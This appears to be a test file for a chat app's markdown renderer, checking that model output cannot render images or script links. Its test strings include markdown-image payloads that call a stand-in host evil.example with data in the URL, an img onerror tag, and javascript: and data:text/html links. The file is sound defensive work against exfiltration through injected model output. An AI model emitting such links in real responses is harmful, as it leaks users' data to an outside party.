// Renders model output with the exact options components/Markdown.tsx uses (react-dom/server, no JSX, no extra deps).
import assert from 'node:assert/strict'
import { test } from 'node:test'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import ReactMarkdown from 'react-markdown'
import { linkifyCitations } from '../src/lib/citations.ts'
import { MARKDOWN_OPTIONS } from '../src/lib/markdown.ts'

const render = (markdown: string) => renderToStaticMarkup(createElement(ReactMarkdown, MARKDOWN_OPTIONS, markdown))

test('never renders an image, so injected markdown cannot make the browser call an attacker URL', () => {
  const attacks = [
    '![x](https://evil.example/c?d=Q3%20revenue%204.2M)', // inline image
    '![x][r]\n\n[r]: https://evil.example/ref', // reference-style image
    'see ![](//evil.example/protocol-relative) here', // protocol-relative
    '![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)', // data URI
    '<img src="https://evil.example/raw" onerror="alert(1)">', // raw HTML
  ]
  for (const markdown of attacks) {
    const html = render(markdown)
    assert.doesNotMatch(html, /<img|<link|evil\.example|data:image/, `${markdown} -> ${html}`)
  }
})

test('an image wrapped in a link loses the image; the link itself still needs a click', () => {
  const html = render('[![x](https://evil.example/img)](https://example.com/page)')
  assert.doesNotMatch(html, /<img|evil\.example/)
  assert.match(html, /<a href="https:\/\/example\.com\/page">/)
})

test('links keep safe targets and lose script/data targets', () => {
  assert.match(render('[docs](https://example.com/a?b=1)'), /href="https:\/\/example\.com\/a\?b=1"/)
  assert.match(render('[mail](mailto:legal@example.com)'), /href="mailto:legal@example.com"/)
  assert.match(render('[x](javascript:alert(1))'), /<a href="">x<\/a>/)
  assert.match(render('[x](data:text/html,<script>alert(1)</script>)'), /<a href="">x<\/a>/)
})

test('citation fragment links and ordinary markdown still render', () => {
  assert.match(render(linkifyCitations('18 days [S1].')), /<a href="#cite-S1">S1<\/a>/)
  const table = render('| Plan | Days |\n|---|---|\n| Basic | **18** |')
  assert.match(table, /<table>/)
  assert.match(table, /<strong>18<\/strong>/)
})
